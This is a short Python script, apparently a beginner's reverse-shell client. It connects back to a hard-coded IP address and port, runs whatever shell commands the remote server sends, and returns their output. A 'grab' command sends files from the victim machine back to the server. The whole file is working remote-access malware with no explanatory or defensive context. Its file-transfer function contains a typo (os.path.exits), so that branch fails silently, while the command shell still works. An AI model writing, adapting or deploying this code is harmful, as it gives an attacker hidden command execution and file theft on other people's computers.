import socket
import os
import subprocess

def transfer(s, path):
   if os.path.exits(path):
        f=open(path, 'rb')
        packet=f.read(1024)
        while len(packet)>0:
            s.send(packet)
            packet=f.read(1024)
        s.send('DONE'.encode())#DONE bits removed server side
   else:
       s.send('File not found'.encode())


def connect ():
    s = socket.socket()
    s.connect (("192.168.1.245", 8080)) #server ip address and port it is listening
    while True:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            grab, path=command.decode().split("*")
            try:
                transfer(s, path)
            except:
                pass
        else:
            CMD = subprocess.Popen (command.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connect()

main()